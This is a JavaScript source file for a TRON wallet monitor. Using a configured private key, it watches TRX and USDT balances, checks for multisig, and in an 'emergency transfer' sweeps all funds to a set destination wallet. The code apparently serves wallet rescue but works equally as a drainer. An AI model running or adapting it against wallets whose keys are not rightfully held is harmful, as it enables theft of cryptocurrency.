const TronWeb = require('tronweb');
const AbstractChainMonitor = require('./AbstractChainMonitor');

class TronChainMonitor extends AbstractChainMonitor {
  constructor(config) {
    super('TRON', config);
    
    this.tronWebs = [];
    this.mainTronWeb = null;
    this.rpcEndpoints = config.rpcEndpoints || [
      'https://api.trongrid.io',
      'https://api.tronstack.io'
    ];
    
    this.usdtContract = config.usdtContract || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    this.normalFeeLimit = config.normalFeeLimit || 20000000;
    this.emergencyFeeLimit = config.emergencyFeeLimit || 100000000;
  }

  async setupConnection() {
    this.log('🔗 Testing TRON RPC connections...');
    
    const privateKey = this.config.privateKey;
    
    const testPromises = this.rpcEndpoints.map(async (endpoint, i) => {
      try {
        const tronWeb = new TronWeb({
          fullHost: endpoint,
          privateKey: privateKey
        });
        
        await Promise.race([
          tronWeb.trx.getCurrentBlock(),
          new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
        ]);
        
        return { success: true, tronWeb, index: i, endpoint };
      } catch (error) {
        return { success: false, index: i, endpoint, error: error.message };
      }
    });
    
    const results = await Promise.allSettled(testPromises);
    
    results.forEach((result) => {
      if (result.status === 'fulfilled') {
        const { success, tronWeb, index, endpoint, error } = result.value;
        if (success) {
          this.tronWebs.push(tronWeb);
          this.log(`✅ RPC ${index} connected: ${endpoint}`);
        } else {
          this.log(`❌ RPC ${index} failed: ${endpoint}`);
        }
      }
    });
    
    if (this.tronWebs.length === 0) {
      throw new Error('❌ All TRON RPC endpoints failed!');
    }
    
    this.log(`🚀 ${this.tronWebs.length} TRON RPC endpoints ready!\n`);
    
    this.mainTronWeb = this.tronWebs[0];
    const address = this.mainTronWeb.address.fromPrivateKey(privateKey);
    
    this.log(`🔑 Wallet: ${address}`);
    this.log(`📍 Destination: ${this.destinationWallet}\n`);
  }

  sunToTrx(sun) {
    return Number(sun) / 1000000;
  }

  async getUSDTBalance(tronWeb) {
    try {
      const address = tronWeb.defaultAddress.base58;
      
      try {
        const parameter = [{type: 'address', value: address}];
        const transaction = await tronWeb.transactionBuilder.triggerConstantContract(
          this.usdtContract,
          'balanceOf(address)',
          {},
          parameter,
          address
        );
        
        if (transaction && transaction.constant_result && transaction.constant_result[0]) {
          return BigInt('0x' + transaction.constant_result[0]);
        }
      } catch (e) {}
      
      try {
        const contract = await tronWeb.contract().at(this.usdtContract);
        const balance = await contract.balanceOf(address).call();
        return BigInt(balance.toString());
      } catch (e) {}
      
      return 0n;
      
    } catch (error) {
      return 0n;
    }
  }

  async getBalances() {
    for (let i = 0; i < this.tronWebs.length; i++) {
      try {
        const tronWeb = this.tronWebs[i];
        const address = tronWeb.defaultAddress.base58;
        
        const trxBalance = BigInt(await tronWeb.trx.getBalance(address));
        const usdtBalance = await this.getUSDTBalance(tronWeb);
        
        return { native: trxBalance, usdt: usdtBalance, rpcIndex: i };
        
      } catch (error) {
        continue;
      }
    }
    
    throw new Error('All TRON RPCs failed');
  }

  async checkMultisig() {
    try {
      const address = this.mainTronWeb.defaultAddress.base58;
      const account = await this.mainTronWeb.trx.getAccount(address);
      
      if (account.active_permission && account.active_permission.length > 0) {
        const activePermission = account.active_permission[0];
        if (activePermission.keys && activePermission.keys.length > 1) {
          return true;
        }
      }
      return false;
    } catch (error) {
      return false;
    }
  }

  async executeTransfer(trxBalance, usdtAmount) {
    this.log(`\n⚡⚡ EMERGENCY TRANSFER INITIATED! ⚡⚡`);
    this.log(`🎯 Smart failover - maximum speed with efficiency`);
    this.log(`💰 USDT: ${Number(usdtAmount) / 1000000} | TRX: ${this.sunToTrx(trxBalance)}`);
    
    const txHashes = [];
    let usdtSuccess = false;
    let trxSuccess = false;
    
    if (usdtAmount > 0n) {
      for (let i = 0; i < this.tronWebs.length; i++) {
        try {
          const tronWeb = this.tronWebs[i];
          const address = tronWeb.defaultAddress.base58;
          
          const functionSelector = 'transfer(address,uint256)';
          const parameter = [
            {type: 'address', value: this.destinationWallet},
            {type: 'uint256', value: usdtAmount.toString()}
          ];
          
          const tx = await tronWeb.transactionBuilder.triggerSmartContract(
            this.usdtContract,
            functionSelector,
            {
              feeLimit: this.emergencyFeeLimit,
              callValue: 0
            },
            parameter,
            address
          );
          
          if (!tx || !tx.transaction) {
            this.log(`⚠️ USDT RPC ${i} failed to build tx`);
            continue;
          }
          
          const signed = await tronWeb.trx.sign(tx.transaction);
          const result = await tronWeb.trx.sendRawTransaction(signed, { shouldPollResponse: false });
          
          if (result && result.result) {
            const txid = result.txid || result.transaction?.txID;
            if (txid) {
              txHashes.push({ type: 'USDT', txid });
              this.log(`✅ USDT TX: ${txid}`);
              usdtSuccess = true;
              break;
            }
          }
        } catch (error) {
          const isInsufficientFunds = error.message.includes('insufficient') || error.message.includes('balance');
          this.log(`⚠️ USDT RPC ${i}: ${error.message}`);
          if (i === this.tronWebs.length - 1) {
            this.log(`❌ All RPCs failed for USDT transfer`);
            if (isInsufficientFunds) {
              return { success: false, txHashes, insufficientFunds: true };
            }
          }
        }
      }
    } else {
      usdtSuccess = true;
    }
    
    const feeReserve = 1000000n;
    if (trxBalance > feeReserve) {
      const amountToSend = trxBalance - feeReserve;
      
      for (let i = 0; i < this.tronWebs.length; i++) {
        try {
          const tronWeb = this.tronWebs[i];
          
          const tx = await tronWeb.transactionBuilder.sendTrx(
            this.destinationWallet,
            Number(amountToSend)
          );
          
          const signed = await tronWeb.trx.sign(tx);
          const result = await tronWeb.trx.sendRawTransaction(signed, { shouldPollResponse: false });
          
          if (result && result.result) {
            const txid = result.txid || result.transaction?.txID;
            if (txid) {
              txHashes.push({ type: 'TRX', txid });
              this.log(`✅ TRX TX: ${txid}`);
              trxSuccess = true;
              break;
            }
          }
        } catch (error) {
          const isInsufficientFunds = error.message.includes('insufficient') || error.message.includes('balance');
          this.log(`⚠️ TRX RPC ${i}: ${error.message}`);
          if (i === this.tronWebs.length - 1) {
            this.log(`❌ All RPCs failed for TRX transfer`);
            if (isInsufficientFunds) {
              return { success: false, txHashes, insufficientFunds: true };
            }
          }
        }
      }
    } else {
      trxSuccess = true;
    }
    
    if (usdtSuccess && trxSuccess) {
      this.log(`🎯 TRANSFER BROADCASTED!\n`);
      txHashes.forEach(tx => this.broadcastedTxHashes.add(tx.txid));
      return { success: true, txHashes };
    } else {
      this.log(`⚠️ Transfer failed - will retry!\n`);
      return { success: false, txHashes };
    }
  }

  formatNativeBalance(balance) {
    return `${this.sunToTrx(balance).toFixed(6)} TRX`;
  }

  getMinimumNativeBalance() {
    return 1000000n;
  }

  getExplorerUrl(txHash) {
    return `https://tronscan.org/#/transaction/${txHash}`;
  }
}

module.exports = TronChainMonitor;
